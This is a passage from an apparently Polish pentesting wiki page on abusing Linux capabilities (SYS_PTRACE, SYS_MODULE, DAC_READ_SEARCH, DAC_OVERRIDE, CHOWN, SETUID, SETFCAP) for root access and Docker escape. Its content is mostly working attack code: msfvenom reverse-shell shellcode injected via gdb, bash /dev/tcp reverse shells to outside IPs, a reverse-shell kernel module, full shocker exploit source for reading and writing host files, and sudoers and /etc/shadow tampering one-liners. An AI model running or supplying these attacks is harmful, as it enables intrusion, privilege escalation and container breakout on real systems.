0xbffffe5c:     0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
0xbffffe64:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
0xbffffe6c:     0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80
(gdb) quit
```

Teraz możesz użyć wygenerowanego shellcode'u do wstrzykiwania go w pamięć w celu uzyskania dostępu do powłoki systemowej.
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debuguj proces roota za pomocą gdb i skopiuj-wklej wcześniej wygenerowane linie gdb:
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Przykład z środowiskiem (Docker breakout) - kolejne nadużycie gdb**

Jeśli **GDB** jest zainstalowany (lub można go zainstalować za pomocą `apk add gdb` lub `apt install gdb` na przykład), można **debugować proces z hosta** i sprawić, aby wywołał funkcję `system`. (Ta technika wymaga również uprawnienia `SYS_ADMIN`).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Nie będziesz w stanie zobaczyć wyniku wykonanej komendy, ale zostanie ona wykonana przez ten proces (aby uzyskać powłokę rev).

{% hint style="warning" %}
Jeśli otrzymasz błąd "No symbol "system" in current context.", sprawdź poprzedni przykład ładowania shellcode do programu za pomocą gdb.
{% endhint %}

**Przykład z użyciem środowiska (przełamanie Docker) - Wstrzyknięcie kodu Shell**

Możesz sprawdzić włączone uprawnienia wewnątrz kontenera Docker, używając:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Lista **procesów** działających na **hostingu** `ps -eaf`

1. Pobierz **architekturę** `uname -m`
2. Znajdź **shellcode** dla tej architektury ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Znajdź **program**, który wstrzyknie **shellcode** do pamięci procesu ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Zmodyfikuj** shellcode wewnątrz programu i **skompiluj** go `gcc inject.c -o inject`
5. **Wstrzyknij** go i złap swoją **powłokę**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** umożliwia procesowi **ładowanie i usuwanie modułów jądra (systemowe wywołania `init_module(2)`, `finit_module(2)` i `delete_module(2)`)**, oferując bezpośredni dostęp do podstawowych operacji jądra. Ta zdolność niesie ze sobą poważne ryzyko bezpieczeństwa, ponieważ umożliwia eskalację uprawnień i całkowite skompromitowanie systemu, umożliwiając modyfikacje jądra i omijanie wszystkich mechanizmów bezpieczeństwa Linuxa, w tym modułów bezpieczeństwa Linuxa i izolacji kontenerów.
**Oznacza to, że możesz** **wstawiać/usuwać moduły jądra w/ze jądra maszyny hostującej.**

**Przykład z użyciem binarnego pliku**

W poniższym przykładzie binarny plik **`python`** ma tę zdolność.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Domyślnie polecenie **`modprobe`** sprawdza listę zależności i pliki mapy w katalogu **`/lib/modules/$(uname -r)`**.\
Aby wykorzystać to, stwórzmy fałszywy folder **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Następnie **skompiluj moduł jądra, poniżej znajdziesz 2 przykłady, a następnie skopiuj** go do tego folderu:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Wreszcie, wykonaj potrzebny kod Pythona, aby załadować ten moduł jądra:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Przykład 2 z plikiem binarnym**

W poniższym przykładzie plik binarny **`kmod`** ma tę zdolność.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Co oznacza, że można użyć polecenia **`insmod`** do wstawienia modułu jądra. Przyjrzyj się poniższemu przykładowi, aby uzyskać **odwróconą powłokę** wykorzystując tę uprzywilejowaną możliwość.

**Przykład z użyciem środowiska (przełamanie Docker)**

Możesz sprawdzić włączone uprawnienia wewnątrz kontenera Docker, używając:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyniku można zobaczyć, że możliwość **SYS\_MODULE** jest włączona.

**Utwórz** moduł **jądra**, który będzie wykonywał odwróconą powłokę i **Makefile**, aby go **skompilować**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Pusty znak przed każdym słowem make w pliku Makefile **musi być tabulatorem, a nie spacją**!
{% endhint %}

Wykonaj polecenie `make`, aby go skompilować.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Wreszcie, uruchom `nc` wewnątrz powłoki i **załaduj moduł** z innej powłoki, aby przechwycić powłokę w procesie nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Kod tej techniki został skopiowany z laboratorium "Wykorzystywanie uprawnień SYS\_MODULE" ze strony** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Inny przykład tej techniki można znaleźć pod adresem [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia procesowi **ominięcie uprawnień do odczytu plików oraz odczytu i wykonania katalogów**. Jego głównym zastosowaniem jest wyszukiwanie plików lub odczyt. Jednakże, umożliwia również procesowi użycie funkcji `open_by_handle_at(2)`, która może uzyskać dostęp do dowolnego pliku, włącznie z tymi spoza przestrzeni montowania procesu. Uchwyt używany w `open_by_handle_at(2)` powinien być nieprzezroczystym identyfikatorem uzyskanym za pomocą `name_to_handle_at(2)`, ale może zawierać wrażliwe informacje, takie jak numery i-węzłów, które są podatne na manipulację. Potencjał wykorzystania tej zdolności, zwłaszcza w kontekście kontenerów Docker, został zademonstrowany przez Sebastiana Krahmera za pomocą exploitu shocker, jak analizuje się [tutaj](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Oznacza to, że można ominąć sprawdzanie uprawnień do odczytu plików oraz sprawdzanie uprawnień do odczytu/wykonania katalogów.**

**Przykład z użyciem binariów**

Binarny plik będzie mógł odczytać dowolny plik. Jeśli plik, na przykład tar, ma tę zdolność, będzie mógł odczytać plik shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Przykład z binary2**

W tym przypadku załóżmy, że binarny plik **`python`** ma tę zdolność. Aby wyświetlić listę plików roota, możesz wykonać:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Aby odczytać plik, można wykonać:
```python
print(open("/etc/shadow", "r").read())
```
**Przykład w środowisku (Docker breakout)**

Możesz sprawdzić włączone uprawnienia wewnątrz kontenera Docker za pomocą:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyniku można zobaczyć, że włączona jest zdolność **DAC\_READ\_SEARCH**. W rezultacie kontener może **debugować procesy**.

Możesz dowiedzieć się, jak działa następujące wykorzystanie pod adresem [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ale w skrócie **CAP\_DAC\_READ\_SEARCH** nie tylko pozwala nam na przeglądanie systemu plików bez sprawdzania uprawnień, ale także wyraźnie usuwa wszelkie sprawdzanie _**open\_by\_handle\_at(2)**_ i **może pozwolić naszemu procesowi na odczytywanie wrażliwych plików otwartych przez inne procesy**.

Oryginalne wykorzystanie, które wykorzystuje te uprawnienia do odczytywania plików z hosta, można znaleźć tutaj: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), poniżej znajduje się **zmodyfikowana wersja, która pozwala wskazać plik, który chcesz odczytać jako pierwszy argument i zrzucić go do pliku.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
W celu wykorzystania podatności, należy znaleźć wskaźnik do czegoś zamontowanego na hoście. Oryginalna podatność używała pliku /.dockerinit, a ta zmodyfikowana wersja używa /etc/hostname. Jeśli podatność nie działa, być może trzeba ustawić inny plik. Aby znaleźć plik zamontowany na hoście, wystarczy wykonać polecenie mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Kod tej techniki został skopiowany z laboratorium "Wykorzystywanie zdolności DAC\_READ\_SEARCH" z** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Mając **misję promowania wiedzy technicznej**, ten kongres jest gorącym punktem spotkań dla profesjonalistów technologii i cyberbezpieczeństwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Oznacza to, że można ominąć sprawdzanie uprawnień do zapisu dla dowolnego pliku, więc można zapisać dowolny plik.**

Istnieje wiele plików, które można **nadpisać, aby podnieść uprawnienia,** [**możesz czerpać pomysły stąd**](payloads-to-execute.md#nadpisywanie-pliku-w-celu-podniesienia-uprawnień).

**Przykład z użyciem binarnego pliku**

W tym przykładzie vim ma tę zdolność, więc można modyfikować dowolny plik, tak jak _passwd_, _sudoers_ lub _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Przykład z binarnym plikiem 2**

W tym przykładzie binarny plik **`python`** będzie miał tę zdolność. Możesz użyć pythona do nadpisania dowolnego pliku:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Przykład z użyciem środowiska + CAP_DAC_READ_SEARCH (przełamanie Docker)**

Możesz sprawdzić włączone uprawnienia wewnątrz kontenera Docker za pomocą:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Po pierwsze, przeczytaj poprzednią sekcję, która [**wykorzystuje uprawnienie DAC\_READ\_SEARCH do odczytywania dowolnych plików**](linux-capabilities.md#cap\_dac\_read\_search) na hoście i **skompiluj** exploit.\
Następnie, **skompiluj poniższą wersję exploitu shocker**, która umożliwi zapisywanie dowolnych plików w systemie plików hosta:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Aby uciec z kontenera Docker, można **pobrać** pliki `/etc/shadow` i `/etc/passwd` z hosta, **dodać** do nich **nowego użytkownika** i użyć **`shocker_write`** do ich nadpisania. Następnie można uzyskać dostęp za pomocą **ssh**.

**Kod tej techniki został skopiowany z laboratorium "Wykorzystywanie zdolności DAC\_OVERRIDE" z** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Oznacza to, że można zmienić właściciela dowolnego pliku.**

**Przykład z użyciem binariów**

Załóżmy, że binarny plik **`python`** ma tę zdolność, można **zmienić** **właściciela** pliku **shadow**, **zmienić hasło roota** i podnieść uprawnienia:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Lub z użyciem binarnego pliku **`ruby`** posiadającego tę zdolność:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Oznacza to, że można zmienić uprawnienia dowolnego pliku.**

**Przykład z użyciem pliku binarnego**

Jeśli Python ma tę zdolność, można zmienić uprawnienia pliku shadow, **zmienić hasło roota** i podnieść uprawnienia:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Oznacza to, że można ustawić efektywne ID użytkownika utworzonego procesu.**

**Przykład z użyciem pliku binarnego**

Jeśli python ma tę **zdolność**, można ją łatwo wykorzystać do eskalacji uprawnień do konta root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Inny sposób:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**To oznacza, że można ustawić efektywne ID grupy utworzonego procesu.**

Istnieje wiele plików, które można **nadpisać, aby podnieść uprawnienia,** [**możesz zaczerpnąć pomysły stąd**](payloads-to-execute.md#nadpisanie-pliku-w-celu-podniesienia-uprawnień).

**Przykład z użyciem pliku binarnego**

W tym przypadku powinieneś szukać interesujących plików, które grupa może odczytać, ponieważ możesz podszywać się pod dowolną grupę:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Gdy już znajdziesz plik, który można wykorzystać (poprzez odczyt lub zapis) do eskalacji uprawnień, możesz **uzyskać powłokę, podszywając się pod interesującą grupę** za pomocą:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
W tym przypadku grupa shadow została podrobiona, dzięki czemu można odczytać plik `/etc/shadow`:
```bash
cat /etc/shadow
```
Jeśli zainstalowano **docker**, można **udawać** grupę **docker** i wykorzystać to do komunikacji z [gniazdem docker](./#writable-docker-socket) i eskalacji uprawnień.

## CAP\_SETFCAP

**Oznacza to, że można ustawiać uprawnienia dla plików i procesów**

**Przykład z użyciem pliku binarnego**

Jeśli python ma tę **zdolność**, można łatwo z niej skorzystać, aby eskalować uprawnienia do roota:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Zauważ, że jeśli ustawisz nową zdolność dla pliku binarnego za pomocą CAP\_SETFCAP, stracisz tę zdolność.
{% endhint %}

Gdy już posiadasz zdolność [SETUID](linux-capabilities.md#cap\_setuid), możesz przejść do jej sekcji, aby zobaczyć, jak podnieść uprawnienia.

**Przykład z wykorzystaniem środowiska (przełamanie Docker)**

Domyślnie zdolność **CAP\_SETFCAP jest przyznawana procesowi wewnątrz kontenera w Dockerze**. Możesz to sprawdzić wykonując coś takiego:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Ta zdolność pozwala **przydzielić dowolną inną zdolność binarnym plikom wykonywalnym**, więc możemy rozważyć **ucieczkę** z kontenera, **wykorzystując jedno z innych naruszeń zdolności** wymienionych na tej stronie.\
Jednak jeśli spróbujesz na przykład przydzielić zdolności CAP\_SYS\_ADMIN i CAP\_SYS\_PTRACE do pliku wykonywalnego gdb, zauważysz, że możesz je przydzielić, ale **plik nie będzie w stanie się wykonać po tym**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Z dokumentacji](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Dozwolone: Jest to **ograniczający nadzbiór dla efektywnych uprawnień**, które wątek może przyjąć. Jest to również ograniczający nadzbiór dla uprawnień, które mogą być dodane do zestawu dziedzicznego przez wątek, który **nie ma uprawnienia CAP\_SETPCAP** w swoim zestawie efektywnym._\
Wygląda na to, że uprawnienia Dozwolone ograniczają te, które mogą być używane.\
Jednak Docker domyślnie udziela również **uprawnienia CAP\_SETPCAP**, więc być może będziesz w stanie **ustawić nowe uprawnienia wewnątrz zestawu dziedzicznego**.\
